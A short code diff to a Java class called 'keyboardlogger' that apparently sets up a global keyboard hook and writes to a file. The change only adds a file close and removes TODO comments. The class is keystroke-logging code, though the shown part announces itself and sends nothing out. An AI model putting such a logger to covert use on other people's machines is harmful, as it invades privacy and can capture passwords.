@@ -23,7 +23,7 @@ public class keyboardlogger extends Thread implements Runnable {
 		        		System.out.println("file did not exist.  writing...");
 		        		PrintWriter writer = new PrintWriter(testFile, "UTF-8");
 		        	
-		        	
+		        		writer.close();
 				}
 
 				System.out.println("Global keyboard hook successfully started, press [escape] key to shutdown.");
@@ -75,10 +75,8 @@ public class keyboardlogger extends Thread implements Runnable {
 			
 			log();
 		} catch (FileNotFoundException e) {
-			// TODO Auto-generated catch block
 			e.printStackTrace();
 		} catch (UnsupportedEncodingException e) {
-			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
 	}
